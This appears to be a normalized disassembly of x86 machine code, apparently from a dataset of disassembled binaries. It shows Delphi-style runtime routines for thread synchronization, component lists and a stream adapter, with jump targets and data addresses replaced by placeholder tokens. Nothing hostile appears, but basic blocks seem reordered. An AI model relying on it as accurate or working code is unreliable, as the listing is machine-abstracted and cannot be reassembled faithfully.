push sub_41a8de
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41a8c0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_413fac
call sub_41a350
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41a8a1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8a8
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_41a8fc
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_41a7bc
pop ebp
retn 0x8
sub_41a93c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xe ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_41a989
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SuspendThread
test eax eax
setge dl
mov eax [ ebp - 0x4 ]
call sub_41a77c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a9a8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_41a77c
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_41a9d8
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_41a77c
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_41a374
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_41a77c
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_41aa7c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_41ac34
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_41aac8
push ebx
push esi
push ecx
call sub_4034b0
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41ad1c
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_41acc4
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_4146f0
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41ac8c
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403498
lea eax [ ebx + 0x14 ]
call sub_40d1c0
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_414108
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41ab4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_414164
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413fac
mov edx ebx
mov eax esi
call sub_41ab4c
sub_41abe0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413fac
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x10 ] eax
sub_41ac0c
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4142a4
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403124
xor eax eax
mov [ ebx + 0x10 ] eax
sub_41ac34
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403320
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_41abe0
mov dl 0x1
mov eax ebx
call sub_41b154
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41b104
sub_41ac8c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41b154
mov edx ebx
mov eax esi
call sub_41ac0c
pop edi
pop esi
pop ebx
retn
sub_41acc4
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4141f0
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41ac8c
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_41ac0c
sub_41ad1c
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_414108
call sub_41ad1c
inc edi
dec esi
jne r-xdata
sub_41ad58
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4142a4
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403124
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41ad7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ad58
mov edx ebx
mov eax esi
call sub_41ad58
pop esi
pop ebx
retn
sub_41ad98
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41ad7c
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_414108
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41adf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_41aba0
push ebx
push sub_41abc8
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41abb4
push ebx
push sub_41abd4
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41aeec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407c60
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41af84
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
sub_41af84
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_414108
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407c60
test al al
jne r-xdata
sub_41afd4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404304
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407de4
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
xor edx edx
mov eax ebx
call sub_41b154
mov edx esi
mov eax ebx
call sub_41b060
mov dl 0x1
mov eax ebx
call sub_41b154
sub_41b074
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_414108
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_414094
sub_41b0b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_414164
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413ff8
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_414184
sub_41b104
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41b0a0
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41b074
mov cl 0x1
mov edx ebx
call sub_41b104
inc edi
dec ebp
jne r-xdata
sub_41b154
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404194
mov edx esp
mov eax esi
call sub_4033f8
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41b19c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41b1c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41b20c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031d8
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41b26c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41b290
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_41b2d8
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
mov edx esi
call sub_41b508
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_41b340
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41b508
mov edx ebx
mov eax esi
call sub_41b4fc
sub_41b384
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41aa7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_41b3c8
push ebx
push esi
push edi
call sub_4034b0
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41aac8
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41ad7c
jmp r-xdata
mov eax esi
call sub_4141f0
mov edx eax
mov eax edi
call sub_41b508
lea eax [ edi + 0x50 ]
call sub_40d1c0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403498
sub_41b428
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41ad98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41b454
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41b470
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41b48c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_414108
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41b508
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413ff8
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_414108
cmp ebp eax
jne r-xdata
sub_41b548
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41ad7c
mov edx ebx
call sub_41ab4c
sub_41b574
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_41b5bc
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403124
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_41b5f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41b643
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b65c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41b6ab
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b6c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41b72e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41b748
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41b791
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_4166e4
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41b7ac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_40560c
xor eax eax
push ebp
push sub_41b999
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41b972
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026e4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41b961
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_402704
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b9a0
lea eax [ ebp + 0xc ]
call sub_405598
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41b9dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41ba3f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
